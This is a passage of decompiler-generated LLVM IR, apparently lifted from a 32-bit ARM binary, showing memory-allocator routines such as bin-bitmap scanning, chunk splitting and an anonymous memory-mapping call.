  %v1_11920 = phi i32 [ %v4_11a44, %.dec_label_pc_1191c_crit_edge ], [ %v3_117c8, %dec_label_pc_1191c.loopexit ], [ %v2_11910, %dec_label_pc_11910 ]
  %v0_1191c = phi i32 [ %v7_11a44, %.dec_label_pc_1191c_crit_edge ], [ %v4_117cc, %dec_label_pc_1191c.loopexit ], [ %v3_11914, %dec_label_pc_11910 ]
  %v1_1191c = or i32 %v0_1191c, 1
  store i32 %v1_1191c, i32* %r3.global-to-local, align 4
  %v2_11920 = add i32 %v1_11920, 4
  %v3_11920 = inttoptr i32 %v2_11920 to i32*
  store i32 %v1_1191c, i32* %v3_11920, align 4
  br label %dec_label_pc_11edc

dec_label_pc_11928:                               ; preds = %dec_label_pc_118f8
  %v1_11928 = load i32, i32* @sl, align 4
  %v2_11928 = add i32 %v1_11928, %v0_11908
  store i32 %v2_11928, i32* %r2.global-to-local, align 4
  %v1_1192c = or i32 %v1_11928, 1
  store i32 %v1_1192c, i32* %r3.global-to-local, align 4
  %v0_11930 = load i32, i32* %lr.global-to-local, align 4
  %v1_11930 = or i32 %v0_11930, 1
  store i32 %v1_11930, i32* %r1.global-to-local, align 4
  store i32 %v1_11908, i32* %r4.global-to-local, align 4
  %v2_11938 = add i32 %v0_11908, 4
  %v3_11938 = inttoptr i32 %v2_11938 to i32*
  store i32 %v1_1192c, i32* %v3_11938, align 4
  %v0_1193c = load i32, i32* %r2.global-to-local, align 4
  %v1_1193c = load i32, i32* @r6, align 4
  %v2_1193c = add i32 %v1_1193c, 8
  %v3_1193c = inttoptr i32 %v2_1193c to i32*
  store i32 %v0_1193c, i32* %v3_1193c, align 4
  %v0_11940 = load i32, i32* %r2.global-to-local, align 4
  %v1_11940 = load i32, i32* @r6, align 4
  %v2_11940 = add i32 %v1_11940, 12
  %v3_11940 = inttoptr i32 %v2_11940 to i32*
  store i32 %v0_11940, i32* %v3_11940, align 4
  %v0_11944 = load i32, i32* %lr.global-to-local, align 4
  %v1_11944 = load i32, i32* %r2.global-to-local, align 4
  %v3_11944 = add i32 %v1_11944, %v0_11944
  %v4_11944 = inttoptr i32 %v3_11944 to i32*
  store i32 %v0_11944, i32* %v4_11944, align 4
  %v0_11948 = load i32, i32* %r1.global-to-local, align 4
  %v1_11948 = load i32, i32* %r2.global-to-local, align 4
  %v2_11948 = add i32 %v1_11948, 4
  %v3_11948 = inttoptr i32 %v2_11948 to i32*
  store i32 %v0_11948, i32* %v3_11948, align 4
  %v0_1194c = load i32, i32* @r6, align 4
  %v1_1194c = load i32, i32* %r2.global-to-local, align 4
  %v2_1194c = add i32 %v1_1194c, 12
  %v3_1194c = inttoptr i32 %v2_1194c to i32*
  store i32 %v0_1194c, i32* %v3_1194c, align 4
  %v0_11950 = load i32, i32* @r6, align 4
  %v1_11950 = load i32, i32* %r2.global-to-local, align 4
  %v2_11950 = add i32 %v1_11950, 8
  %v3_11950 = inttoptr i32 %v2_11950 to i32*
  store i32 %v0_11950, i32* %v3_11950, align 4
  br label %dec_label_pc_11edc

dec_label_pc_1195c:                               ; preds = %dec_label_pc_118c4, %dec_label_pc_118b4
  %v1_118ec = phi i32 [ %storemerge.pre, %dec_label_pc_118b4 ], [ %v3_118d0, %dec_label_pc_118c4 ]
  store i32 %v1_118ec, i32* %ip.global-to-local, align 4
  %v9_1195c = icmp eq i32 %v1_118ec, %v1_118b8
  br i1 %v9_1195c, label %dec_label_pc_11964.loopexit, label %dec_label_pc_118c4

dec_label_pc_11964.loopexit:                      ; preds = %dec_label_pc_1195c
  br label %dec_label_pc_11964

dec_label_pc_11964:                               ; preds = %dec_label_pc_118ac.dec_label_pc_11964_crit_edge, %dec_label_pc_11964.loopexit
  %v4_11994.pre-phi = phi i32 [ %.pre200, %dec_label_pc_118ac.dec_label_pc_11964_crit_edge ], [ %v4_118b4, %dec_label_pc_11964.loopexit ]
  %v1_11964 = add i32 %v0_11964.pre, 1
  store i32 %v1_11964, i32* %r2.global-to-local, align 4
  %v1_11968 = urem i32 %v1_11964, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 124088, i32* %r0.global-to-local, align 4
  %v6_11974 = shl i32 1, %v1_11968
  store i32 %v6_11974, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_1197c = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_1197c, i32* %r3.global-to-local, align 4
  %v3_11980 = udiv i32 %v1_11964, 32
  store i32 %v3_11980, i32* @r5, align 4
  %v4_11984 = mul nuw nsw i32 %v3_11980, 4
  %v5_11984 = add i32 %v4_1197c, %v4_11984
  store i32 %v5_11984, i32* %r2.global-to-local, align 4
  %v1_11988 = add i32 %v5_11984, 820
  %v2_11988 = inttoptr i32 %v1_11988 to i32*
  %v3_11988 = load i32, i32* %v2_11988, align 4
  store i32 %v3_11988, i32* @r4, align 4
  %v1_1198c = add i32 %v4_1197c, 52
  store i32 %v1_1198c, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_11994 = add i32 %v1_1198c, %v4_11994.pre-phi
  store i32 %v5_11994, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11998

dec_label_pc_11998:                               ; preds = %dec_label_pc_11a00, %dec_label_pc_11964
  %v1_119a0 = phi i32 [ %v1_119a0.pre, %dec_label_pc_11a00 ], [ %v3_11988, %dec_label_pc_11964 ]
  %v0_119a0 = phi i32 [ %v0_11998.pre, %dec_label_pc_11a00 ], [ %v6_11974, %dec_label_pc_11964 ]
  %v1_11998 = sub i32 1, %v0_119a0
  %v2_11998 = icmp ult i32 %v0_119a0, 2
  %v1_11998. = select i1 %v2_11998, i32 %v1_11998, i32 0
  store i32 %v1_11998., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_119a0, %v1_119a0
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_11998
  %v5_119a4 = or i32 %v1_11998., 1
  store i32 %v5_119a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_119b0.preheader

bb142:                                            ; preds = %dec_label_pc_11998
  %v2_119a8 = icmp eq i32 %v1_11998., 0
  br i1 %v2_119a8, label %.dec_label_pc_119ec.preheader_crit_edge, label %dec_label_pc_119b0.preheader

.dec_label_pc_119ec.preheader_crit_edge:          ; preds = %bb142
  %v0_119e454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_119ec.preheader

dec_label_pc_119b0.preheader:                     ; preds = %bb142, %.thread12
  %v0_119b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_119b0

dec_label_pc_119b0:                               ; preds = %dec_label_pc_119b0.preheader, %dec_label_pc_119bc
  %v0_119b0 = phi i32 [ %v0_119b0.pre, %dec_label_pc_119b0.preheader ], [ %v1_119b0, %dec_label_pc_119bc ]
  %v1_119b0 = add i32 %v0_119b0, 1
  store i32 %v1_119b0, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_119b0, 2
  br i1 %tmp208, label %dec_label_pc_11a90.loopexit, label %dec_label_pc_119bc

dec_label_pc_119bc:                               ; preds = %dec_label_pc_119b0
  store i32 124088, i32* %r3.global-to-local, align 4
  %v1_119c0 = load i32, i32* @r8, align 4
  %v2_119c0 = add i32 %v1_119c0, 124088
  %v3_119c0 = inttoptr i32 %v2_119c0 to i32*
  %v4_119c0 = load i32, i32* %v3_119c0, align 4
  store i32 %v4_119c0, i32* %r2.global-to-local, align 4
  %v4_119c4 = mul i32 %v1_119b0, 4
  %v5_119c4 = add i32 %v4_119c0, %v4_119c4
  store i32 %v5_119c4, i32* %r3.global-to-local, align 4
  %v1_119c8 = add i32 %v5_119c4, 820
  %v2_119c8 = inttoptr i32 %v1_119c8 to i32*
  %v3_119c8 = load i32, i32* %v2_119c8, align 4
  store i32 %v3_119c8, i32* @r4, align 4
  %v2_119cc = icmp eq i32 %v3_119c8, 0
  br i1 %v2_119cc, label %dec_label_pc_119b0, label %dec_label_pc_119d4

dec_label_pc_119d4:                               ; preds = %dec_label_pc_119bc
  %v4_119d4 = mul i32 %v1_119b0, 256
  %v5_119d4 = add i32 %v4_119c0, %v4_119d4
  store i32 %v5_119d4, i32* %r3.global-to-local, align 4
  %v1_119d8 = add i32 %v5_119d4, 44
  store i32 %v1_119d8, i32* %r0.global-to-local, align 4
  %v0_119dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_119dc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_119ec.preheader

dec_label_pc_119ec.preheader:                     ; preds = %.dec_label_pc_119ec.preheader_crit_edge, %dec_label_pc_119d4
  %v0_119e454 = phi i32 [ %v1_119d8, %dec_label_pc_119d4 ], [ %v0_119e454.pre, %.dec_label_pc_119ec.preheader_crit_edge ]
  %v0_11a08 = phi i32 [ %v3_119c8, %dec_label_pc_119d4 ], [ %v1_119a0, %.dec_label_pc_119ec.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_119dc, %dec_label_pc_119d4 ], [ %v0_119a0, %.dec_label_pc_119ec.preheader_crit_edge ]
  %v2_119ec51 = and i32 %ip.promoted, %v0_11a08
  %v4_119ec53 = icmp eq i32 %v2_119ec51, 0
  br i1 %v4_119ec53, label %dec_label_pc_119e4, label %dec_label_pc_119f4

dec_label_pc_119e4:                               ; preds = %dec_label_pc_119ec.preheader, %dec_label_pc_119e4
  %v2_119e856 = phi i32 [ %v2_119e8, %dec_label_pc_119e4 ], [ %ip.promoted, %dec_label_pc_119ec.preheader ]
  %v0_119e455 = phi i32 [ %v1_119e4, %dec_label_pc_119e4 ], [ %v0_119e454, %dec_label_pc_119ec.preheader ]
  %v1_119e4 = add i32 %v0_119e455, 8
  %v2_119e8 = mul i32 %v2_119e856, 2
  %v2_119ec = and i32 %v2_119e8, %v0_11a08
  %v4_119ec = icmp eq i32 %v2_119ec, 0
  br i1 %v4_119ec, label %dec_label_pc_119e4, label %dec_label_pc_119ec.dec_label_pc_119f4_crit_edge

dec_label_pc_119ec.dec_label_pc_119f4_crit_edge:  ; preds = %dec_label_pc_119e4
  store i32 %v1_119e4, i32* %r0.global-to-local, align 4
  store i32 %v2_119e8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_119f4

dec_label_pc_119f4:                               ; preds = %dec_label_pc_119ec.dec_label_pc_119f4_crit_edge, %dec_label_pc_119ec.preheader
  %v0_11a14 = phi i32 [ %v2_119e8, %dec_label_pc_119ec.dec_label_pc_119f4_crit_edge ], [ %ip.promoted, %dec_label_pc_119ec.preheader ]
  %v0_11a38 = phi i32 [ %v1_119e4, %dec_label_pc_119ec.dec_label_pc_119f4_crit_edge ], [ %v0_119e454, %dec_label_pc_119ec.preheader ]
  %v1_119f4 = add i32 %v0_11a38, 12
  %v2_119f4 = inttoptr i32 %v1_119f4 to i32*
  %v3_119f4 = load i32, i32* %v2_119f4, align 4
  store i32 %v3_119f4, i32* @lr, align 4
  %v9_119f8 = icmp eq i32 %v3_119f4, %v0_11a38
  br i1 %v9_119f8, label %dec_label_pc_11a00, label %dec_label_pc_11a20

dec_label_pc_11a00:                               ; preds = %dec_label_pc_119f4
  store i32 124088, i32* %r0.global-to-local, align 4
  %v1_11a04 = load i32, i32* @r8, align 4
  %v2_11a04 = add i32 %v1_11a04, 124088
  %v3_11a04 = inttoptr i32 %v2_11a04 to i32*
  %v4_11a04 = load i32, i32* %v3_11a04, align 4
  %v2_11a08 = sub i32 -1, %v0_11a14
  %v3_11a08 = and i32 %v0_11a08, %v2_11a08
  store i32 %v3_11a08, i32* @r4, align 4
  %v1_11a0c = load i32, i32* @r5, align 4
  %v4_11a0c = mul i32 %v1_11a0c, 4
  %v5_11a0c = add i32 %v4_11a0c, %v4_11a04
  store i32 %v5_11a0c, i32* %r3.global-to-local, align 4
  %v1_11a10 = add i32 %v0_11a38, 8
  store i32 %v1_11a10, i32* %r0.global-to-local, align 4
  %v2_11a14 = mul i32 %v0_11a14, 2
  store i32 %v2_11a14, i32* %ip.global-to-local, align 4
  %v2_11a18 = add i32 %v5_11a0c, 820
  %v3_11a18 = inttoptr i32 %v2_11a18 to i32*
  store i32 %v3_11a08, i32* %v3_11a18, align 4
  %v0_11998.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_119a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11998

dec_label_pc_11a20:                               ; preds = %dec_label_pc_119f4
  %v1_11a20 = add i32 %v3_119f4, 4
  %v2_11a20 = inttoptr i32 %v1_11a20 to i32*
  %v3_11a20 = load i32, i32* %v2_11a20, align 4
  store i32 %v3_11a20, i32* %r3.global-to-local, align 4
  %v1_11a24 = and i32 %v3_11a20, -4
  store i32 %v1_11a24, i32* %r2.global-to-local, align 4
  %v0_11a28 = load i32, i32* @sl, align 4
  %v2_11a28 = sub i32 %v1_11a24, %v0_11a28
  store i32 %v2_11a28, i32* %ip.global-to-local, align 4
  %v1_11a2c = add i32 %v3_119f4, 12
  %v2_11a2c = inttoptr i32 %v1_11a2c to i32*
  %v3_11a2c = load i32, i32* %v2_11a2c, align 4
  store i32 %v3_11a2c, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_11a28, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_11a20
  %v6_11a34 = add i32 %v1_11a24, %v3_119f4
  store i32 %v6_11a34, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_11a20, %bb143
  %v2_11a38 = add i32 %v3_11a2c, 8
  %v3_11a38 = inttoptr i32 %v2_11a38 to i32*
  store i32 %v0_11a38, i32* %v3_11a38, align 4
  %v0_11a3c = load i32, i32* %r3.global-to-local, align 4
  %v1_11a3c = load i32, i32* %r0.global-to-local, align 4
  %v2_11a3c = add i32 %v1_11a3c, 12
  %v3_11a3c = inttoptr i32 %v2_11a3c to i32*
  store i32 %v0_11a3c, i32* %v3_11a3c, align 4
  %v4_11a40 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_1191c_crit_edge, label %dec_label_pc_11a4c

.dec_label_pc_1191c_crit_edge:                    ; preds = %bb144
  %v5_11a40 = add i32 %v4_11a40, 8
  store i32 %v5_11a40, i32* %r4.global-to-local, align 4
  %v4_11a44 = load i32, i32* %r2.global-to-local, align 4
  %v5_11a44 = add i32 %v4_11a44, 4
  %v6_11a44 = inttoptr i32 %v5_11a44 to i32*
  %v7_11a44 = load i32, i32* %v6_11a44, align 4
  store i32 %v7_11a44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1191c

dec_label_pc_11a4c:                               ; preds = %bb144
  %v1_11a4c = load i32, i32* @sl, align 4
  %v2_11a4c = add i32 %v1_11a4c, %v4_11a40
  store i32 %v2_11a4c, i32* %r1.global-to-local, align 4
  %v1_11a54 = load i32, i32* @r6, align 4
  %v2_11a54 = add i32 %v1_11a54, 8
  %v3_11a54 = inttoptr i32 %v2_11a54 to i32*
  store i32 %v2_11a4c, i32* %v3_11a54, align 4
  %v0_11a58 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a58 = load i32, i32* @r6, align 4
  %v2_11a58 = add i32 %v1_11a58, 12
  %v3_11a58 = inttoptr i32 %v2_11a58 to i32*
  store i32 %v0_11a58, i32* %v3_11a58, align 4
  %v0_11a5c = load i32, i32* @r6, align 4
  %v1_11a5c = load i32, i32* %r1.global-to-local, align 4
  %v2_11a5c = add i32 %v1_11a5c, 8
  %v3_11a5c = inttoptr i32 %v2_11a5c to i32*
  store i32 %v0_11a5c, i32* %v3_11a5c, align 4
  %v0_11a60 = load i32, i32* @r6, align 4
  %v1_11a60 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a60 = add i32 %v1_11a60, 12
  %v3_11a60 = inttoptr i32 %v2_11a60 to i32*
  store i32 %v0_11a60, i32* %v3_11a60, align 4
  %tmp210 = icmp ult i32 %v1_11a4c, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_11a4c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r2.global-to-local, align 4
  %v8_11a6c = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v8_11a6c, i32* %r3.global-to-local, align 4
  %v4_11a70 = load i32, i32* %r1.global-to-local, align 4
  %v6_11a70 = add i32 %v8_11a6c, 48
  %v7_11a70 = inttoptr i32 %v6_11a70 to i32*
  store i32 %v4_11a70, i32* %v7_11a70, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_11a4c, %bb145
  %v0_11a74 = load i32, i32* @sl, align 4
  %v1_11a74 = or i32 %v0_11a74, 1
  store i32 %v1_11a74, i32* %r2.global-to-local, align 4
  %v0_11a78 = load i32, i32* %ip.global-to-local, align 4
  %v1_11a78 = or i32 %v0_11a78, 1
  store i32 %v1_11a78, i32* %r3.global-to-local, align 4
  %v0_11a7c = load i32, i32* @lr, align 4
  %v1_11a7c = add i32 %v0_11a7c, 8
  store i32 %v1_11a7c, i32* %r4.global-to-local, align 4
  %v2_11a80 = add i32 %v0_11a7c, 4
  %v3_11a80 = inttoptr i32 %v2_11a80 to i32*
  store i32 %v1_11a74, i32* %v3_11a80, align 4
  %v0_11a84 = load i32, i32* %ip.global-to-local, align 4
  %v1_11a84 = load i32, i32* %r1.global-to-local, align 4
  %v3_11a84 = add i32 %v1_11a84, %v0_11a84
  %v4_11a84 = inttoptr i32 %v3_11a84 to i32*
  store i32 %v0_11a84, i32* %v4_11a84, align 4
  %v0_11a88 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a88 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a88 = add i32 %v1_11a88, 4
  %v3_11a88 = inttoptr i32 %v2_11a88 to i32*
  store i32 %v0_11a88, i32* %v3_11a88, align 4
  br label %dec_label_pc_11edc

dec_label_pc_11a90.loopexit:                      ; preds = %dec_label_pc_119b0
  br label %dec_label_pc_11a90

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a90.loopexit, %dec_label_pc_116a4, %dec_label_pc_116ac
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %ip.global-to-local, align 4
  %v4_11a98 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11a98, i32* @r0, align 4
  %v1_11a9c = add i32 %v4_11a98, 44
  %v2_11a9c = inttoptr i32 %v1_11a9c to i32*
  %v3_11a9c = load i32, i32* %v2_11a9c, align 4
  store i32 %v3_11a9c, i32* %ip.global-to-local, align 4
  %v1_11aa0 = add i32 %v3_11a9c, 4
  %v2_11aa0 = inttoptr i32 %v1_11aa0 to i32*
  %v3_11aa0 = load i32, i32* %v2_11aa0, align 4
  %v0_11aa4 = load i32, i32* @sl, align 4
  %v1_11aa4 = add i32 %v0_11aa4, 16
  store i32 %v1_11aa4, i32* %r1.global-to-local, align 4
  %v1_11aa8 = and i32 %v3_11aa0, -4
  store i32 %v1_11aa8, i32* %r3.global-to-local, align 4
  %v3_11aac = icmp ult i32 %v1_11aa8, %v1_11aa4
  br i1 %v3_11aac, label %dec_label_pc_11adc, label %dec_label_pc_11ab8

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_11a90
  %v2_11ab8 = sub i32 %v1_11aa8, %v0_11aa4
  %v2_11abc = add i32 %v0_11aa4, %v3_11a9c
  store i32 %v2_11abc, i32* %r1.global-to-local, align 4
  %v1_11ac0 = or i32 %v2_11ab8, 1
  store i32 %v1_11ac0, i32* %r3.global-to-local, align 4
  %v1_11ac4 = or i32 %v0_11aa4, 1
  store i32 %v1_11ac4, i32* %r2.global-to-local, align 4
  %v1_11ac8 = add i32 %v3_11a9c, 8
  store i32 %v1_11ac8, i32* %r4.global-to-local, align 4
  store i32 %v1_11ac4, i32* %v2_11aa0, align 4
  %v0_11ad0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11ad0 = load i32, i32* @r0, align 4
  %v2_11ad0 = add i32 %v1_11ad0, 44
  %v3_11ad0 = inttoptr i32 %v2_11ad0 to i32*
  store i32 %v0_11ad0, i32* %v3_11ad0, align 4
  %v0_11ad4 = load i32, i32* %r3.global-to-local, align 4
  %v1_11ad4 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ad4 = add i32 %v1_11ad4, 4
  %v3_11ad4 = inttoptr i32 %v2_11ad4 to i32*
  store i32 %v0_11ad4, i32* %v3_11ad4, align 4
  br label %dec_label_pc_11edc

dec_label_pc_11adc:                               ; preds = %dec_label_pc_11a90
  %v1_11adc = inttoptr i32 %v4_11a98 to i32*
  %v2_11adc = load i32, i32* %v1_11adc, align 4
  store i32 %v2_11adc, i32* %r3.global-to-local, align 4
  %v1_11ae0 = and i32 %v2_11adc, 2
  store i32 %v1_11ae0, i32* %ip.global-to-local, align 4
  %v2_11ae0 = icmp eq i32 %v1_11ae0, 0
  %v1_11ae4 = add i32 %v4_11a98, 860
  %v2_11ae4 = inttoptr i32 %v1_11ae4 to i32*
  %v3_11ae4 = load i32, i32* %v2_11ae4, align 4
  store i32 %v3_11ae4, i32* %r1.global-to-local, align 4
  br i1 %v2_11ae0, label %dec_label_pc_11afc, label %dec_label_pc_11aec

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11adc
  %v0_11aec = call i32 @function_124bc()
  %v0_11af0 = load i32, i32* @sl, align 4
  %v1_11af0 = add i32 %v0_11af0, -7
  store i32 %v1_11af0, i32* %r0.global-to-local, align 4
  %v1_11af4 = call i32 @function_11604(i32 %v1_11af0)
  store i32 %v1_11af4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ed8

dec_label_pc_11afc:                               ; preds = %dec_label_pc_11adc
  %v1_11afc = add i32 %v4_11a98, 844
  %v2_11afc = inttoptr i32 %v1_11afc to i32*
  %v3_11afc = load i32, i32* %v2_11afc, align 4
  store i32 %v3_11afc, i32* %r3.global-to-local, align 4
  %v3_11b00 = icmp ult i32 %v0_11aa4, %v3_11afc
  %v1_11b04 = add i32 %v3_11ae4, -1
  store i32 %v1_11b04, i32* %sb.global-to-local, align 4
  br i1 %v3_11b00, label %dec_label_pc_11bd8, label %dec_label_pc_11b0c

dec_label_pc_11b0c:                               ; preds = %dec_label_pc_11afc
  %v1_11b0c = add i32 %v4_11a98, 852
  %v2_11b0c = inttoptr i32 %v1_11b0c to i32*
  %v3_11b0c = load i32, i32* %v2_11b0c, align 4
  store i32 %v3_11b0c, i32* %r2.global-to-local, align 4
  %v1_11b10 = add i32 %v4_11a98, 848
  %v2_11b10 = inttoptr i32 %v1_11b10 to i32*
  %v3_11b10 = load i32, i32* %v2_11b10, align 4
  store i32 %v3_11b10, i32* %r3.global-to-local, align 4
  %v6_11b18 = icmp slt i32 %v3_11b10, %v3_11b0c
  br i1 %v6_11b18, label %dec_label_pc_11b1c, label %dec_label_pc_11bd8

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_11b0c
  %v1_11b1c = add i32 %v0_11aa4, 10
  %v2_11b20 = add i32 %v1_11b1c, %v3_11ae4
  store i32 %v2_11b20, i32* %r3.global-to-local, align 4
  %v2_11b24 = sub i32 0, %v3_11ae4
  %v3_11b24 = and i32 %v2_11b20, %v2_11b24
  store i32 %v3_11b24, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_11b24, %v0_11aa4
  br i1 %tmp211, label %dec_label_pc_11b30, label %dec_label_pc_11bd8

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11b1c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_11b24, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_11b48 = call i32 @function_138ec(i32 0, i32 %v3_11b24, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_11b48, i32* %r0.global-to-local, align 4
  %v7_11b4c = icmp eq i32 %v6_11b48, -1
  br i1 %v7_11b4c, label %dec_label_pc_11b30.dec_label_pc_11bd8_crit_edge, label %dec_label_pc_11b54

dec_label_pc_11b30.dec_label_pc_11bd8_crit_edge:  ; preds = %dec_label_pc_11b30
  %v1_11bfc.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_11bd8

dec_label_pc_11b54:                               ; preds = %dec_label_pc_11b30
  %v1_11b54 = urem i32 %v6_11b48, 8
  store i32 %v1_11b54, i32* %r2.global-to-local, align 4
  %v2_11b54 = icmp eq i32 %v1_11b54, 0
  br i1 %v2_11b54, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_11b54
  %v2_11b58 = sub nsw i32 8, %v1_11b54
  store i32 %v2_11b58, i32* %r3.global-to-local, align 4
  %v2_11b5c = load i32, i32* @r4, align 4
  %v3_11b5c = sub i32 %v2_11b5c, %v2_11b58
  %v3_11b60 = add i32 %v2_11b58, %v6_11b48
  store i32 %v3_11b60, i32* %lr.global-to-local, align 4
  %v2_11b68 = or i32 %v3_11b5c, 2
  store i32 %v2_11b68, i32* %r2.global-to-local, align 4
  %v5_11b70 = inttoptr i32 %v3_11b60 to i32*
  store i32 %v2_11b58, i32* %v5_11b70, align 4
  %v1_11b74 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b74 = load i32, i32* %lr.global-to-local, align 4
  %v3_11b74 = add i32 %v2_11b74, 4
  %v4_11b74 = inttoptr i32 %v3_11b74 to i32*
  store i32 %v1_11b74, i32* %v4_11b74, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_11b54
  store i32 %v6_11b48, i32* %lr.global-to-local, align 4
  %v1_11b6c47 = load i32, i32* @r4, align 4
  %v2_11b6c48 = or i32 %v1_11b6c47, 2
  store i32 %v2_11b6c48, i32* %r3.global-to-local, align 4
  %v3_11b78 = inttoptr i32 %v6_11b48 to i32*
  store i32 0, i32* %v3_11b78, align 4
  %v1_11b7c = load i32, i32* %r3.global-to-local, align 4
  %v2_11b7c = load i32, i32* %lr.global-to-local, align 4
  %v3_11b7c = add i32 %v2_11b7c, 4
  %v4_11b7c = inttoptr i32 %v3_11b7c to i32*
  store i32 %v1_11b7c, i32* %v4_11b7c, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 124088, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11b88 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11b88, i32* %ip.global-to-local, align 4
  %v1_11b8c = add i32 %v4_11b88, 848
  %v2_11b8c = inttoptr i32 %v1_11b8c to i32*
  %v3_11b8c = load i32, i32* %v2_11b8c, align 4
  store i32 %v3_11b8c, i32* %r3.global-to-local, align 4
  %v1_11b90 = add i32 %v4_11b88, 856
  %v2_11b90 = inttoptr i32 %v1_11b90 to i32*
  %v3_11b90 = load i32, i32* %v2_11b90, align 4
  store i32 %v3_11b90, i32* %r2.global-to-local, align 4
  %v1_11b94 = add i32 %v3_11b8c, 1
  store i32 %v1_11b94, i32* %r3.global-to-local, align 4
  %v7_11b9c = icmp sgt i32 %v1_11b94, %v3_11b90
  br i1 %v7_11b9c, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_11b94, i32* %v2_11b90, align 4
  %v0_11ba0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_11ba0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_11ba0 = phi i32 [ %v4_11b88, %.thread27 ], [ %v1_11ba0.pre, %bb147 ]
  %v0_11ba0 = phi i32 [ %v1_11b94, %.thread27 ], [ %v0_11ba0.pre, %bb147 ]
  %v2_11ba0 = add i32 %v1_11ba0, 848
  %v3_11ba0 = inttoptr i32 %v2_11ba0 to i32*
  store i32 %v0_11ba0, i32* %v3_11ba0, align 4
  %v0_11ba4 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ba4 = add i32 %v0_11ba4, 868
  %v2_11ba4 = inttoptr i32 %v1_11ba4 to i32*
  %v3_11ba4 = load i32, i32* %v2_11ba4, align 4
  store i32 %v3_11ba4, i32* %r3.global-to-local, align 4
  %v1_11ba8 = add i32 %v0_11ba4, 880
  %v2_11ba8 = inttoptr i32 %v1_11ba8 to i32*
  %v3_11ba8 = load i32, i32* %v2_11ba8, align 4
  store i32 %v3_11ba8, i32* %r2.global-to-local, align 4
  %v0_11bac = load i32, i32* @r4, align 4
  %v2_11bac = add i32 %v0_11bac, %v3_11ba4
  store i32 %v2_11bac, i32* %r1.global-to-local, align 4
  %v1_11bb0 = add i32 %v0_11ba4, 872
  %v2_11bb0 = inttoptr i32 %v1_11bb0 to i32*
  %v3_11bb0 = load i32, i32* %v2_11bb0, align 4
  store i32 %v3_11bb0, i32* %r3.global-to-local, align 4
  %v1_11bb8 = add i32 %v0_11ba4, 884
  %v2_11bb8 = inttoptr i32 %v1_11bb8 to i32*
  %v3_11bb8 = load i32, i32* %v2_11bb8, align 4
  store i32 %v3_11bb8, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_11bac, %v3_11ba8
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_11bac, i32* %v2_11ba8, align 4
  %v0_11bc0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11bc0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_11bc0 = phi i32 [ %v0_11ba4, %bb148 ], [ %v1_11bc0.pre, %bb149 ]
  %v0_11bc0 = phi i32 [ %v2_11bac, %bb148 ], [ %v0_11bc0.pre, %bb149 ]
  %v2_11bc0 = add i32 %v1_11bc0, 868
  %v3_11bc0 = inttoptr i32 %v2_11bc0 to i32*
  store i32 %v0_11bc0, i32* %v3_11bc0, align 4
